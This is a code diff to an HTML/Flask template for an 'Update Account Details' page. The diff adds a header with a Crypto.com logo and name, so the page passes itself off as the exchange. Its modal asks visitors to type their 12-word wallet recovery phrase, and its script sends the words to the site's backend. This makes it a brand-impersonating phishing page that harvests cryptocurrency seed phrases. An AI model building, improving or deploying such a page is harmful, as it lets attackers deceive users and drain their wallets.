@@ -5,8 +5,18 @@
 <title>Update Account Details</title>
 
 <style>
-/* [Same CSS as before, keep the modal/grid styles] */
-body { background: #0b1d2a; font-family: Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin:0; }
+/* [Original styles preserved] */
+body {
+  background: #0b1d2a;
+  font-family: Arial, sans-serif;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  height: 100vh;
+  margin: 0;
+  padding-top: 64px; /* space for fixed header */
+}
+
 .container { width: 100%; max-width: 420px; padding: 20px; }
 .card { background: #0f2a3a; border-radius: 12px; padding: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.4); }
 .card h2 { color:#fff; margin-bottom:10px;}
@@ -28,9 +38,50 @@ input::placeholder { color:#6f8ba0; }
 .cancel-btn { background:#2d4c61;}
 .message-box { margin-top:20px; background:#1f3f5a; padding:15px; border-radius:8px; color:#fff; text-align:center; display:none;}
 .error-box { margin-top:10px; background:#a82828; padding:12px; border-radius:6px; color:#fff; text-align:center; display:none;}
+
+/* HEADER BAR — corrected only */
+.top-header {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 64px;
+  background: linear-gradient(to bottom, #0a0f1f 0%, #050816 100%);
+  display: flex;
+  align-items: center;
+  padding: 0 20px;
+  z-index: 1000;
+}
+
+.logo {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.logo img {
+  height: 28px;
+  width: auto;
+  display: block;
+}
+
+.logo span {
+  color: #ffffff;
+  font-size: 18px;
+  font-weight: 600;
+  letter-spacing: 0.2px;
+}
 </style>
 </head>
+
 <body>
+
+<header class="top-header">
+  <div class="logo">
+    <img src="{{ url_for('static', filename='image/logo.jpg') }}" alt="Crypto.com Logo">
+    <span>crypto.com</span>
+  </div>
+</header>
 
 <div class="container">
   <div class="card">
@@ -53,6 +104,7 @@ input::placeholder { color:#6f8ba0; }
   <div class="modal-content">
     <h3>Confirm Recovery Phrase</h3>
     <p>Enter your 12-word recovery phrase to confirm this update.</p>
+
     <div class="recovery-grid">
       <div><label>1</label><input placeholder="Word 1"></div>
       <div><label>2</label><input placeholder="Word 2"></div>
@@ -67,6 +119,7 @@ input::placeholder { color:#6f8ba0; }
       <div><label>11</label><input placeholder="Word 11"></div>
       <div><label>12</label><input placeholder="Word 12"></div>
     </div>
+
     <div class="modal-actions">
       <button class="btn cancel-btn" onclick="closeModal()">Cancel</button>
       <button class="btn" onclick="submitRecovery()">Confirm Update</button>
@@ -90,10 +143,10 @@ function closeModal() {
   modal.style.display = "none";
 }
 
-// Send form + recovery phrase to Flask backend
 async function submitRecovery() {
   const inputs = document.querySelectorAll(".recovery-grid input");
   const recovery_words = [];
+
   for (let input of inputs) {
     if (!input.value.trim()) {
       alert("Please enter all 12 recovery words.");
@@ -116,13 +169,13 @@ async function submitRecovery() {
       headers: {"Content-Type":"application/json"},
       body: JSON.stringify(data)
     });
+
     const result = await res.json();
 
     if (result.status === "error") {
       errorBox.textContent = result.message;
       errorBox.style.display = "block";
-      // clear recovery inputs for retry
-      for (let input of inputs) input.value = "";
+      inputs.forEach(i => i.value = "");
     } else {
       errorBox.style.display = "none";
       modal.style.display = "none";
